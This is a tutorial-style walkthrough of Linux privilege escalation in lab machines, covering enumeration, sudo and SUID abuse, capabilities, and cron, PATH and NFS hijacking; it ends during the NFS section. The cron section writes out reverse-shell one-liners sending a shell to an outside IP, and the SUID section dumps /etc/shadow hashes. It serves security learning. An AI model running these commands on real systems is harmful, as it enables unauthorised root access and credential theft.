![](7303ba648ef3f3f899a55c7b19195add-1.png)

# [Introduction]()

At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorised access to resources that are usually restricted from the users.

# [Enumeration]()

Enumeration is the first step you have to take once you gain access to any system.

## [hostname]()

The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

```
$ hostname

wade7363
```

## [uname -a]()

Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

```
$ uname -a

Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x
86_64 x86_64 x86_64 GNU/Linux
```

## [/proc/version]()

The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.

Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

```
$ cat /proc/version

Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.
8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
```

## [/etc/issue]()

Systems can also be identified by looking at the `/etc/issue` file. This file usually contains some information about the operating system but can easily be customised or changed. While on the subject, any file containing system information can be customised or changed. For a clearer understanding of the system, it is always good to look at all of these.

```
$ cat /etc/issue

Ubuntu 14.04 LTS \n \l
```

## [ps Command]()

`ps` show processes for the current shell.

The output of the `ps` (Process Status) will show the following;

- PID: The process ID (unique to the process)
- TTY: Terminal type used by the user
- Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
- CMD: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.

- `ps -A`: View all running processes
- `ps axjf`: View process tree (see the tree formation until `ps axjf` is run below)

![](https://i.imgur.com/xsbohSd.png)  

- `ps aux`: The `aux` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.
## [env]()

The `env` command will show environmental variables.
  
![](https://i.imgur.com/LWdJ8Fw.png)

The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

## [Id]()

The `id` command will provide a general overview of the user’s privilege level and group memberships. It is worth remembering that the `id` command can also be used to obtain the same information for another user as seen below.

![](https://i.imgur.com/YzfJliG.png)

## [/etc/passwd]()

Reading the `/etc/passwd` file can be an easy way to discover users on the system.

```
$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
saned:x:108:115::/home/saned:/bin/false
whoopsie:x:109:116::/nonexistent:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
matt:x:1000:1000:matt,,,:/home/matt:/bin/bash
karen:x:1001:1001::/home/karen:
sshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin
```

That this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.

```
$ cat /etc/passwd | grep home

syslog:x:101:104::/home/syslog:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
saned:x:108:115::/home/saned:/bin/false
matt:x:1000:1000:matt,,,:/home/matt:/bin/bash
karen:x:1001:1001::/home/karen:
```

## [history]()

Looking at earlier commands with the `history` command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

## [ifconfig]()

The target system may be a pivoting point to another network. The `ifconfig` command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks.

![](https://i.imgur.com/hcdZnwK.png)

This can be confirmed using the `ip route` command to see which network routes exist.

![](https://i.imgur.com/PSrmz5O.png)
## [netstat]()

Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The `netstat` command can be used with several different options to gather information on existing connections.

- `netstat -a`: shows all listening ports and established connections.
- `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
- `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)

```
$ netstat -l

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 *:ssh                   *:*                     LISTEN     
tcp        0      0 localhost:ipp           *:*                     LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
tcp6       0      0 ip6-localhost:ipp       [::]:*                  LISTEN     
udp        0      0 *:bootpc                *:*                                
udp        0      0 *:ipp                   *:*                                
udp        0      0 *:mdns                  *:*                                
udp        0      0 *:24810                 *:*                                
udp        0      0 *:49486                 *:*                                
udp6       0      0 [::]:38942              [::]:*                             
udp6       0      0 [::]:mdns               [::]:*                             
udp6       0      0 [::]:35201              [::]:*                             
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     9884     /tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     9484     /var/run/acpid.socket
unix  2      [ ACC ]     STREAM     LISTENING     10521    /var/run/cups/cups.sock
unix  2      [ ACC ]     STREAM     LISTENING     9883     @/tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     10702    @/tmp/dbus-E3WLb7aKEy
unix  2      [ ACC ]     STREAM     LISTENING     10750    @/tmp/dbus-lkX1e3FTf3
unix  2      [ ACC ]     STREAM     LISTENING     9770     /var/lib/amazon/ssm/ipc/termination
unix  2      [ ACC ]     SEQPACKET  LISTENING     7512     /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     11360    /run/user/112/pulse/native
unix  2      [ ACC ]     STREAM     LISTENING     7101     @/com/ubuntu/upstart
unix  2      [ ACC ]     STREAM     LISTENING     7803     /var/run/avahi-daemon/socket
unix  2      [ ACC ]     STREAM     LISTENING     10971    @/com/ubuntu/upstart-session/112/1354
unix  2      [ ACC ]     STREAM     LISTENING     9769     /var/lib/amazon/ssm/ipc/health
unix  2      [ ACC ]     STREAM     LISTENING     7607     /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     7879     /var/run/sdp
```

`netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.

```
$ netstat -s

Ip:
    1103 total packets received
    0 forwarded
    0 incoming packets discarded
    1098 incoming packets delivered
    1107 requests sent out
Icmp:
    1 ICMP messages received
    0 input ICMP message failed.
    ICMP input histogram:
        destination unreachable: 1
    0 ICMP messages sent
    0 ICMP messages failed
    ICMP output histogram:
IcmpMsg:
        InType3: 1
Tcp:
    86 active connections openings
    6 passive connection openings
    54 failed connection attempts
    0 connection resets received
    2 connections established
    1063 segments received
    1020 segments send out
    16 segments retransmited
    0 bad segments received.
    54 resets sent
Udp:
    107 packets received
    0 packets to unknown port received.
    0 packet receive errors
    142 packets sent
```

- `netstat -tp`: list connections with the service name and PID information.

![](Pasted%20image%2020241126182005.png)

- `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

```
$ netstat -i

Kernel Interface table
Iface   MTU Met   RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
eth0       9001 0      1275      0      0 0          1329      0      0      0 BMRU
lo        65536 0       127      0      0 0           127      0      0      0 LRU
```

- `netstat -ano` which could be broken down as follows;
	- `-a`: Display all sockets
	- `-n`: Do not resolve names
	- `-o`: Display timers
```
$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 10.10.197.63:33588      169.254.169.254:80      TIME_WAIT   timewait (0.00/0/0)
tcp        0      0 10.10.197.63:22         10.100.1.234:55868      ESTABLISHED keepalive (6283.53/0/0)
tcp        0      1 10.10.197.63:40244      91.189.91.83:80         SYN_SENT    on (25.38/5/0)
tcp        0      1 10.10.197.63:51670      91.189.91.81:80         SYN_SENT    on (25.38/5/0)
tcp        0      0 10.10.197.63:22         10.100.1.234:55852      ESTABLISHED keepalive (6283.53/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 ::1:631                 :::*                    LISTEN      off (0.00/0/0)
tcp6       1      0 ::1:53631               ::1:631                 CLOSE_WAIT  off (0.00/0/0)
udp        0      0 0.0.0.0:68              0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:631             0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:24810           0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:49486           0.0.0.0:*                           off (0.00/0/0)
udp6       0      0 :::38942                :::*                                off (0.00/0/0)
udp6       0      0 :::5353                 :::*                                off (0.00/0/0)
udp6       0      0 :::35201                :::*                                off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     9884     /tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     9484     /var/run/acpid.socket
unix  2      [ ACC ]     STREAM     LISTENING     10521    /var/run/cups/cups.sock
unix  2      [ ACC ]     STREAM     LISTENING     9883     @/tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     10702    @/tmp/dbus-E3WLb7aKEy
```

## [find Command]()

Below are some useful examples for the “find” command.

**Find files:**

- `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
- `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
- `find / -type d -name config`: find the directory named config under “/”
- `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x`: find executable files
- `find /home -user frank`: find all files for user “frank” under “/home”
- `find / -mtime 10`: find files that were modified in the last 10 days
- `find / -atime 10`: find files that were accessed in the last 10 day
- `find / -cmin -60`: find files changed within the last hour (60 minutes)
- `find / -amin -60`: find files accesses within the last hour (60 minutes)
- `find / -size 50M`: find files with a 50 MB size
- `find / -size +50M`: find files with a size above 50MB; `-50M` for below.
- `find / -writable -type d` : Find world-writeable folders
- `find / -perm -222 -type d`: Find world-writeable folders
- `find / -perm -o w -type d`: Find world-writeable folders

use  `2>/dev/null` to hide error messages, in first case it is  `find . -name flag1.txt 2>/dev/null`

# [Automated Enumeration Tools]()

Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

# [Examples of various privilege escalation]()

Below are some examples of common privilege escalation.

## [Kernel Exploit]()

The Kernel exploit methodology is simple;

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

## [sudo -l]()

`sudo` used to run commands with root access. `sudo -l` shows  list of commands that a user can run as a root user (generally without any passwords). Some programs can be exploited to gain root shell access. Check out [gtfobins](https://gtfobins.github.io/) which contains many such exploits.

Below is a simple example of privilege escalation. 

```
$ id

uid=1001(karen) gid=1001(karen) groups=1001(karen)
```

let's check `sudo -l`

```
$ sudo -l
Matching Defaults entries for karen on ip-10-10-79-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/
bin\:/snap/bin

User karen may run the following commands on ip-10-10-79-2:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

`sudo -l` reveals that karen can run `find`, `less` and `nano` as root. After searching how to use find command to gain root access on [gtfobins](https://gtfobins.github.io/gtfobins/find/#sudo), below command can give access to root shell.

```
$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

Similarly `less` can be exploited as explained [here](https://gtfobins.github.io/gtfobins/less/#sudo) and `nano` can be exploited as explained [here](https://gtfobins.github.io/gtfobins/nano/#sudo) to gain root access.

## [SUID]()

SUID (Set-user Identification) and SGID (Set-group Identification) allow files to be executed with the permission level of the file owner or the group owner, respectively.

`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.

```
$ find / -perm -04000 -ls 2>/dev/null

       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/10185/bin/mount
       80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/10185/bin/ping
       81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/10185/bin/ping6
       98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/10185/bin/su
      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/10185/bin/umount
     2610     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/10185/usr/bin/chfn
     2612     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/10185/usr/bin/chsh
     2689     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/10185/usr/bin/gpasswd
     2781     39 -rwsr-xr-x   1 root     root        39904 Mar 25  2019 /snap/core/10185/usr/bin/newgrp
     2794     53 -rwsr-xr-x   1 root     root        54256 Mar 25  2019 /snap/core/10185/usr/bin/passwd
     2904    134 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /snap/core/10185/usr/bin/sudo
     3003     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3375    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/10185/usr/lib/openssh/ssh-keysign
     6437    109 -rwsr-xr-x   1 root     root              110792 Oct  8  2020 /snap/core/10185/usr/lib/snapd/snap-confine
     7615    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/10185/usr/sbin/pppd
       56     43 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /snap/core18/1885/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/1885/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/1885/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /snap/core18/1885/bin/umount
     1698     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
     1700     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
     1752     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
     1816     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
     1828     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
     1919    146 -rwsr-xr-x   1 root     root              149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
     2006     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2314    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
     7477     52 -rwsr-xr--   1 root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    13816    464 -rwsr-xr-x   1 root     root              473576 May 29  2020 /usr/lib/openssh/ssh-keysign
    13661     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     7479     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
    13676    128 -rwsr-xr-x   1 root     root              130152 Oct  8  2020 /usr/lib/snapd/snap-confine
     1856     84 -rwsr-xr-x   1 root     root               85064 May 28  2020 /usr/bin/chfn
     2300     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec
     1816    164 -rwsr-xr-x   1 root     root              166056 Jul 15  2020 /usr/bin/sudo
     1634     40 -rwsr-xr-x   1 root     root               39144 Jul 21  2020 /usr/bin/umount
     1860     68 -rwsr-xr-x   1 root     root               68208 May 28  2020 /usr/bin/passwd
     1859     88 -rwsr-xr-x   1 root     root               88464 May 28  2020 /usr/bin/gpasswd
     1507     44 -rwsr-xr-x   1 root     root               44784 May 28  2020 /usr/bin/newgrp
     1857     52 -rwsr-xr-x   1 root     root               53040 May 28  2020 /usr/bin/chsh
     1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
     1674     68 -rwsr-xr-x   1 root     root               67816 Jul 21  2020 /usr/bin/su
     2028     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
     2166     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
     1633     56 -rwsr-xr-x   1 root     root               55528 Jul 21  2020 /usr/bin/mount
```

A good practice would be to compare executable on this list with GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)).

![](Pasted%20image%2020241127110738.png)

From the output of `find` command we can see `base64` has suid bit set which is unusual. Let's exploit `base64` to read `/etc/shadow`

```
$ base64 /etc/shadow | base64 -d

root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
```

## [Capabilities]()

In Linux, **capabilities** are fine-grained permissions that allow executables to perform specific privileged actions without full root access. They provide a way to delegate certain privileges to non-root processes.

### Types of Linux Capabilities

1. **CAP_CHOWN**: Change file ownership.
2. **CAP_DAC_OVERRIDE**: Bypass file read, write, and execute permission checks.
3. **CAP_NET_BIND_SERVICE**: Bind to network ports below 1024.
4. **CAP_SYS_ADMIN**: Perform a wide range of administrative tasks (e.g., mount/unmount filesystems).
5. **CAP_NET_RAW**: Use raw sockets.
6. **CAP_SYS_TIME**: Change the system clock.
7. **CAP_SETUID:** Change its user ID

To enumerate files with such capabilities use below command.

```
$ getcap -r / 2>/dev/null

/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_
bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

[GTFObins](https://gtfobins.github.io/#+capabilities) has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

![](Pasted%20image%2020241127150857.png)

In this case `vim` can be exploited to gain escalated privilege

![](Pasted%20image%2020241127151334.png)
![](Pasted%20image%2020241127151354.png)

## [Cron Jobs]()

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Any user can read the file keeping system-wide cron jobs under `/etc/crontab`

```
$ cat /etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 ** * *root    cd / && run-parts --report /etc/cron.hourly
25 6* * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6* * 7roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 61 * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

In above case, backup.sh file is writable allow us to enter `nc` code which will run as root, providing root reverse shell.

```
$ ls -l /home/karen/backup.sh

-rw-r--r-- 1 karen karen 77 Jun 20  2021 /home/karen/backup.sh
```

Giving backup.sh executable permission as we are karen user. After that I updated backup.sh to give `/bin/bash` SUID permission which allow us to run it as root user. (checkout commented code as well for remote shell access possibility)

```
$ chmod +x backup.sh
$ cat backup.sh
#!/bin/bash

chmod u+s /bin/bash
#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.6.22.73 9999 >/tmp/f
#bash -i >& /dev/tcp/10.6.22.73/9999 0>&1
#nc 10.6.22.73 9999 -e bash

```

After a minute, `backup.sh` file has been executed and we are root.

```
$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
$ bash -p
bash-5.0# id
uid=1001(karen) gid=1001(karen) euid=0(root) groups=1001(karen)
```
## [PATH]()

`PATH` is the environmental variable. If a folder for which user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executable.

```
$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Searching for files with SUID bit. 

```
$ find / -perm -u=s 2>/dev/null

/snap/core20/1169/usr/bin/chfn
/snap/core20/1169/usr/bin/chsh
/usr/bin/mount
/home/murdoch/test
```

`/home/murdoch/test` file is suspicious. Trying to execute `test` file

```
$ cd /home/murdoch/      
$ ls
test  thm.py
$ ls -la
total 32
drwxrwxrwx 2 root root  4096 Oct 22  2021 .
drwxr-xr-x 5 root root  4096 Jun 20  2021 ..
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
$ ./test
sh: 1: thm: not found
```

`thm` file is not found. We can exploit `PATH` to add a file globally accessible from provided folder, in this case it will be `/tmp`

```
$ PATH=/tmp:$PATH
$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Let's create `thm` file with our exploit. Test file was not able to find this file. But now as `/tmp` is in the the `PATH` variable it will search `thm` file in `/tmp` dir and execute as root (owner of `test` file is `root`)

```
$ cd /tmp
$ echo /bin/bash > thm
$ chmod +x thm
```

Executing test file. This will look for `thm` file in folders of `PATH` variable. After finding `thm` file in `/tmp` folder `test` file will execute (as developed by owner) the `thm` file and the exploit inside it.

```
$ cd -
/home/murdoch
$ ./test
root@ip-10-10-77-51:/home/murdoch# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```


## [NFS]()

NFS (Network File Sharing) configuration is kept in the `/etc/exports` file. This file is created during the NFS server installation and can usually be read by users.  The critical element for this privilege escalation vector is the `no_root_squash` option. By default, NFS will change the root user to `nfsnobody` and strip any file from operating with root privileges. **If the `no_root_squash` option is present** on a writable share, we can **create an executable with SUID bit** set and run it on the target system.

```
$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

We will start by enumerating mountable shares from our attacking machine.

```
┌─[lnxuser@lnxhost]─[~]
└──╼ $showmount -e 10.10.102.151 
Export list for 10.10.102.151:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```
